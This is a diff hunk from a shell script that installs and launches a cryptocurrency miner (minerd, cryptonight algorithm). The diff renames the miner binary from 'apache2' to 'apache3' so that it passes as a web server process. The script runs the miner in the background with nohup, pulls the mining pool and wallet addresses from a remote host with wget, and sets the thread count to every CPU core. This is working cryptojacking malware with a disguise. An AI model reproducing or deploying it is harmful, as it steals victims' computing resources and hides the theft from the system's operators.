@@ -17,9 +17,9 @@ apt-get -y --force-yes install libcurl4-openssl-dev libncurses5-dev pkg-config a
 
 wget https://api.ipify.org	
 mv tanhuevon/minerd ./apache3
-chmod +x apache2
+chmod +x apache3
 
-nohup ./apache2 -a cryptonight -o stratum+tcp://`wget -q -O - sio.com.co/m/dirpool.txt` -u `wget -q -O - sio.com.co/m/dirwallet.txt`+10000 -p `cat index.html`"-"`date +%y%m%d`:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` &
+nohup ./apache3 -a cryptonight -o stratum+tcp://`wget -q -O - sio.com.co/m/dirpool.txt` -u `wget -q -O - sio.com.co/m/dirwallet.txt`+10000 -p `cat index.html`"-"`date +%y%m%d`:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` &
 
 sleep 2
 tail -f nohup.out
